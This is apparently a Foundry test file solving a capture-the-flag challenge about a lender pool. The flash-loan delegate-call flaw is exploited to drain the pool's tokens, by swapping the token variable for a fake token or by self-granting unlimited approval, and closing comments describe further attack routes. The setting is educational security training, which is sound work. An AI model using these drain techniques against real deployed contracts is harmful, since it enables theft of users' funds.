// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";


/* 
Two solutions have been provided

SOLUTION 2 is much cleaner


*/ 

contract Challenge1Test is Test {
    InSecureumLenderPool target; 
    IERC20 token;

    address player = makeAddr("player");

    function setUp() public {

        token = IERC20(address(new InSecureumToken(10 ether)));
        
        
        target = new InSecureumLenderPool(address(token));
        token.transfer(address(target), 10 ether);
        
        vm.label(address(token), "InSecureumToken");
    }

    function testChallenge() public {        
        vm.startPrank(player);
        
        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/
        Exploit exploitToken = new Exploit();
        exploitToken.transfer(address(target), 10 ether);     // sending equal amount of dumbTokens to the lending pool



        //=== this is a sample of flash loan usage
        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();

        target.flashLoan(
          address(_flashLoanReceiver),
          abi.encodeWithSignature(
            "receiveFlashLoan(address,address)", player, address(exploitToken)
          )
        );
        //===

        //============================//

        vm.stopPrank();

        assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
    }
}


/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

// @dev this is a demo contract that is used to receive the flash loan
contract FlashLoandReceiverSample {
    IERC20 public token;
    function receiveFlashLoan(address _user, address _fakeTokenAddr) public {
        // check tokens before doing arbitrage or liquidation or whatever
        uint256 balanceBefore = token.balanceOf(address(this));

        console.log("Address before attack : ", address(token));
        console.log("Balance before attack : ", balanceBefore);
        // do something with the tokens and get profit!
        token.transfer(_user, 10 ether);

        uint256 balanceAfter = token.balanceOf(address(this));
        console.log("Balance After attack : ", balanceAfter);


        token = IERC20(_fakeTokenAddr);

        console.log("Address after change : ", address(token));
        

        uint256 balanceAfter2 = token.balanceOf(address(this));
        console.log("Balance of dumb token : ", balanceAfter2);
    }
}

// @dev this is the solution
contract Exploit is ERC20 {

    constructor() ERC20("dumbToken", "dum") {
        _mint(msg.sender, 10 ether);
    }    

}




/* 
SOLUTION 2
A much better Solution


    function testChallenge() public {        
        vm.startPrank(player);
        
        //////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////
    // STEP 0: Deploy the Exploit contract.
    Exploit exploit = new Exploit();

    // STEP 1: Trigger the flash loan.
    vulnerable.flashLoan(
    // Pool should delegate call into the Exploit  contract.
    address(exploit),
    // Create an ABI-encoded call as data.
    
    abi.encodeWithSelector(
        // The function of the Exploit to be called.
        Exploit.flashloanCallback.selector,
        // The function arguments:
        token, // The token to call the approve() function on
        player // The player address this test contract is currently pretending to be
    )
);

// STEP 3: With the approval given by the callback,
// transfer all of the Pool's token to the player account.
token.transferFrom(
    address(vulnerable),
    player,
    token.balanceOf(address(vulnerable))
);

        vm.stopPrank();

        assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
    }
}




contract Exploit {

    // STEP 2: This callback function will be delegate-called by the pool.
    function flashloanCallback(IERC20 poolToken, address testAddress) external {
        // Having the pools context and therefore identity,
        // we can give this contract an unlimited approval.

        poolToken.approve(testAddress, type(uint256).max);
    }
}


*/


/* 
OTHER SOLUTIONS
The interesting thing about this way to exploit it is, that even if the delegate-call would be changed to a normal call, 
it would still be vulnerable! 
The flashLoan() function allows us to specify any address as a borrower 
and it would then make an arbitrary call to this address with the data we provided it. 
What if we specify the token as the borrower? What if we specify the approve function as data? 
The pool would make this external call and effectively the same as before would happen.

But there's more! As mentioned previously, delegate-calling is as if the called function is part of the Pool. 
That also means we obtain access to its state variables:

We could replace the token in the inSecureumToken variable with some other worthless token that claims that the pool has the appropriate balance. 
We can just keep the real tokens!
We could toggle the _flashLoan variable and would be able to re-enter the Pool by calling deposit(). 
That way we can re-redeposit the loaned money as if it was ours 
and later withdraw() it too!

But we don't even have to bother with calling the deposit() function. 
Why not just directly change the balances variable 
and assign the entire Pool's funds as balance to us?



External calls, and especially delegate-calls, are quite powerful and dangerous.

*/